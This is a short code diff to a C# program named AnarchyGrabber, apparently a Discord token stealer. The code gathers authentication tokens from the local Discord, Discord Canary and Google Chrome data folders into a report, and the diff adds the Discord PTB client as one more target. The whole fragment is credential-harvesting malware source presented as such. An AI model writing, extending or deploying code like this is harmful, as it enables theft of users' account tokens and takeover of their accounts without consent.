@@ -11,6 +11,8 @@ namespace AnarchyGrabber
             //attempt to get tokens from the different services (feel free to add more)
             report.Add("**Discord**");
             report.AddRange(Grabber.GetTokens(@"Roaming\Discord"));
+            report.Add("**Discord PTB**");
+            report.AddRange(Grabber.GetTokens(@"Roaming\discordptb"));
             report.Add("\n**Discord Canary**");
             report.AddRange(Grabber.GetTokens(@"Roaming\discordcanary", true));
             report.Add("\n**Google Chrome**");
